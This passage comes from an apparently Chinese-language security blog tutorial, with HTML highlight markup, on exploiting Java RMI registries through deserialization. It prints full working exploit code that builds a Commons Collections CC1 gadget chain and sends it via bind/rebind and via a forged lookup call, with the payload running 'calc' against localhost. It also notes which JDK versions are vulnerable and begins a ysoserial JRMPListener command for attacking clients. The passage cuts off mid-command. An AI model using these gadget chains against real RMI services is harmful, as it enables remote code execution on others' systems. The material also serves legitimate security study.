(Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var7, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                &#125;<br></code></pre></td></tr></table></figure><p>这里为了演示，先将CC链的依赖导进来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;  <br> &lt;!-- https:<span class="hljs-comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span><br> &lt;dependency&gt;  <br> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  <br> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  <br> &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;  <br> &lt;/dependency&gt;&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure><p>这里准备使用CC1链</p><p>回忆一下我们的CC1链</p><p><img src="/img/RMI/r77.png"></p><p>原本 CC1 的最后面是 <code>InvocationHandler.readObject()</code>，现在我们要让客户端的 <code>bind()</code> 方法执行 <code>readObject()</code></p><p>但是又因为这里有一个需要注意的点就是调用<code>bind()</code>的时候无法传入<code>AnnotationInvocationHandler</code>类的对象，必须要转为Remote类才行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">evalObject</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); <span class="hljs-comment">// 将</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">proxyEvalObject</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, evalObject));<br></code></pre></td></tr></table></figure><p>注：这里的<code>InvocationHandler</code> 是 Java 反射机制的一部分，通常与 <strong>动态代理</strong>（<code>Proxy</code>）一起使用。当你通过反射创建一个代理对象时，这个代理对象需要一个 <code>InvocationHandler</code> 来处理所有方法调用。<code>InvocationHandler</code> 会接管对代理对象的方法调用，然后执行你自定义的处理逻辑</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.rmi.Remote;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) CC1();  <br> <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(  <br>                Remote.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, handler));  <br> registry.bind(<span class="hljs-string">&quot;test&quot;</span>,remote);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br> <span class="hljs-keyword">return</span> o;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>先运行服务端，再运行此代码，成功弹出计算器</p><p><img src="/img/RMI/r78.png"></p><p><code>rebind</code>攻击和<code>bind</code>攻击一样，只需要将<code>bind</code>替换为<code>rebind</code></p><h3 id="unbind-lookup攻击"><a href="#unbind-lookup攻击" class="headerlink" title="unbind&#x2F;lookup攻击"></a>unbind&#x2F;lookup攻击</h3><p>与bind和rebind一样，我们也去查看一下对应的源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var10 = var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var8 = var6.lookup(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var9.writeObject(var8);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                &#125;<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var10 = var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                &#125;<br></code></pre></td></tr></table></figure><p>可以看到这两个方法都是只能传入字符串的</p><p>这里我们可以通过伪造 <code>lookup</code> 连接请求进行利用，修改 <code>lookup</code> 方法代码使其可以传入对象</p><p>原先的lookup方法</p><p>Registry_Stub#lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//创建一个新的远程调用</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>            var3.writeObject(var1); <span class="hljs-comment">// 将参数写入输出流</span><br>        &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;序列化参数时出错&quot;</span>, var18);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var2); <span class="hljs-comment">// 执行远程调用</span><br><br>        Remote var23;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>            var23 = (Remote)var6.readObject(); <span class="hljs-comment">// 反序列化返回的远程对象</span><br>        &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;反序列化返回值时出错&quot;</span>, var15);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;反序列化返回值时出错&quot;</span>, var16);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var2); <span class="hljs-comment">// 完成远程调用的后处理</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var23; <span class="hljs-comment">// 返回远程对象</span><br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>        <span class="hljs-keyword">throw</span> var19;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>        <span class="hljs-keyword">throw</span> var20;<br>    &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;未声明的检查异常&quot;</span>, var22);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>重要的代码有以下几条，这里我们重点看传输部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//传输</span><br><span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>var3.writeObject(var1);<br><span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br><span class="hljs-comment">//接收</span><br><span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>var23 = (Remote)var6.readObject();<br></code></pre></td></tr></table></figure><p>我们需要伪造的是传输中的var2，感觉这个var2类似于数据包的请求头</p><p>operations和super.ref是我们需要获取的信息</p><p>operations是写好的我们可以直接把这段代码copy过来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br></code></pre></td></tr></table></figure><p>找一下super.ref</p><p>调试一下，获取到ref</p><p><img src="/img/RMI/r79.png"></p><p>利用反射获取到这个ref</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  <br>fields_0[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) fields_0[<span class="hljs-number">0</span>].get(registry);  <br></code></pre></td></tr></table></figure><ol><li>registry.getClass()</li></ol><p>这返回与 registry 对象关联的 Class 对象，而 registry 是 Registry 的一个实例。</p><ol start="2"><li>getSuperclass()</li></ol><p>getSuperclass() 方法被调用了两次，用来向上查找继承关系。Registry 类（即 java.rmi.registry.Registry 的实现）继承自 java.rmi.server.RemoteServer，而 RemoteServer 又继承自 java.rmi.server.RemoteObject。</p><p>第一次调用 getSuperclass() 会从 Registry 类返回到 RemoteServer。</p><p>第二次调用会从 RemoteServer 返回到 RemoteObject。</p><ol start="3"><li>getDeclaredFields()</li></ol><p>此方法获取 RemoteObject 类（第二个父类）中声明的所有字段。通常，像 UnicastRef 这样的 RMI 相关字段就会在这里出现。</p><p>通过访问 fields_0[0]，代码假定 RemoteObject 类中的第一个字段是 UnicastRef，它保存了远程对象的引用。由于该字段通常是私有的，代码通过 setAccessible(true) 来绕过 Java 的访问控制检查</p><p>EXP</p><p>这个漏洞的触发点实际上是在ref.invoke(var2);代码</p><p>invoke函数会调用executeCall()方法，这个方法是真正处理网络请求的方法，这里会执行反序列化的操作，从这里会触发我们构造的反序列化链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) CC1();<br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(<br>                Remote.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, handler));<br><br>        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();<br>        fields_0[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) fields_0[<span class="hljs-number">0</span>].get(registry);<br><br>        <span class="hljs-comment">//获取operations</span><br><br>        Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br><br>        <span class="hljs-comment">// 伪造lookup的代码，去伪造传输信息</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        var3.writeObject(remote);<br>        ref.invoke(var2);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br></code></pre></td></tr></table></figure><p>顺利弹出计算器</p><p><img src="/img/RMI/r80.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注意这两个poc (bind&#x2F;rebind和unbind&#x2F;lookup)只能在 jdk7u71以下的版本才能执行，7u71这个版本也不行，我用的是7u66这个版本的JDK，因为在7u71及以上的版本中AnnotationInvocationHandler的readObject方法中，LazyMap被替换成了LinkedHashMap因此无法触发LazyMap构造的POC，虽然有绕过方法，但是这里只是为了说明RMI的漏洞，所以降低JDK版本即可</p><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>对于注册中心来说，我们还是从这几个方法触发：</p><ul><li>bind</li><li>unbind</li><li>rebind</li><li>list</li><li>lookup</li></ul><p>除了<code>unbind</code>和<code>rebind</code>都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener</p><p>相当于是重新起了一个恶意的注册中心，这里返回的数据可以受我们控制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> .\ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span 